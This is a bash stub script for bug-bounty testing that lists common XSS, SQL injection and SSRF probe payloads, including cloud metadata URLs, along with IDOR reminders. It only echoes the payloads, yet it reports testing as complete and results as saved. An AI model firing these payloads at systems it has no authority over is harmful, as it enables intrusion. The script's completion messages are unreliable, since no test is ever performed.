#!/bin/bash
# Bug Hunter - Vulnerability Testing Script
# Usage: ./vulntest.sh <target> [test-type]
#
# Test types: xss, sqli, ssrf, idor, all

set -e

TARGET=$1
TEST_TYPE=${2:-all}
OUTPUT_DIR="/tmp/bug-hunter-$TARGET"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target> [xss|sqli|ssrf|idor|all]"
    exit 1
fi

echo "[*] Starting vulnerability testing for: $TARGET"
echo "[*] Test type: $TEST_TYPE"

mkdir -p "$OUTPUT_DIR/$TEST_TYPE"

# ===== XSS Testing =====
if [[ "$TEST_TYPE" == "xss" ]] || [[ "$TEST_TYPE" == "all" ]]; then
    echo "[+] Testing for XSS vulnerabilities..."

    XSS_PAYLOADS=(
        "<script>alert(1)</script>"
        "<img src=x onerror=alert(1)>"
        "<svg onload=alert(1)>"
        "\"><script>alert(1)</script>"
        "' onclick='alert(1)"
        "{{constructor.constructor('alert(1)')()}}"
    )

    # Use Gowitness or similar to find input points (simplified)
    for payload in "${XSS_PAYLOADS[@]}"; do
        echo "    [*] Testing payload: $payload"
        # In real usage, you'd use a tool like dalfox or custom script
    done

    echo "[+] XSS testing complete (manual verification needed)"
fi

# ===== SQLi Testing =====
if [[ "$TEST_TYPE" == "sqli" ]] || [[ "$TEST_TYPE" == "all" ]]; then
    echo "[+] Testing for SQL Injection..."

    SQLI_PAYLOADS=(
        "' OR '1'='1"
        "' OR 1=1--"
        "\" OR 1=1--"
        "' UNION SELECT null--"
        "' AND SLEEP(5)--"
        "1' ORDER BY 1--"
    )

    for payload in "${SQLI_PAYLOADS[@]}"; do
        echo "    [*] Testing payload: $payload"
    done

    echo "[+] SQLi testing complete (manual verification needed)"
fi

# ===== SSRF Testing =====
if [[ "$TEST_TYPE" == "ssrf" ]] || [[ "$TEST_TYPE" == "all" ]]; then
    echo "[+] Testing for SSRF..."

    SSRF_PAYLOADS=(
        "http://localhost/"
        "http://127.0.0.1/"
        "http://169.254.169.254/latest/meta-data/"
        "http://metadata.google.internal/computeMetadata/v1/"
        "http://[::1]:8080/"
    )

    for payload in "${SSRF_PAYLOADS[@]}"; do
        echo "    [*] Testing: $payload"
    done

    echo "[+] SSRF testing complete"
fi

# ===== IDOR Testing =====
if [[ "$TEST_TYPE" == "idor" ]] || [[ "$TEST_TYPE" == "all" ]]; then
    echo "[+] Testing for IDOR..."

    # Test by changing ID parameters
    echo "    [*] Check for predictable IDs in URLs"
    echo "    [*] Test horizontal privilege escalation"
    echo "    [*] Test vertical privilege escalation"

    echo "[+] IDOR testing complete"
fi

echo ""
echo "[*] Vulnerability testing complete"
echo "[*] Results saved to: $OUTPUT_DIR/$TEST_TYPE/"
echo ""
echo "[*] Note: Automated tests are starting points only."
echo "[*] Manual verification is required for all findings."